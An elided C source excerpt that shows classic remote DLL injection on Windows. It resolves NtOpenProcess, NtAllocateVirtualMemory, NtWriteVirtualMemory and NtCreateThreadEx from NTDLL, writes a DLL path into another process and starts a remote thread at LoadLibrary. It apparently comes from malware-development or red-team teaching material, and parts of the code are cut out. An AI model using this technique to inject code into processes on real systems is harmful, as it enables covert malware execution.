...
int main(int argc, char* argv[]) {
    ...
    // Populating NTDLL function prototypes
    info("Populating NTDLL function prototypes");
    pNtCreateThreadEx xCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    pNtOpenProcess xOpenProcess = (pNtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    pNtAllocateVirtualMemory xAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory xWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    ...
    status = xOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &ci);
    ...
    status = xAllocateVirtualMemory(hProcess, &rBuffer, NULL, &pathSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if (status != STATUS_SUCCESS) {
    ...
    status = xWriteVirtualMemory(hProcess, rBuffer, dllPath, sizeof(dllPath), &bytesWritten);
    if (status != STATUS_SUCCESS) {
    ...
    status = xCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, xLoadLibrary, rBuffer, FALSE, NULL, NULL, NULL, NULL);
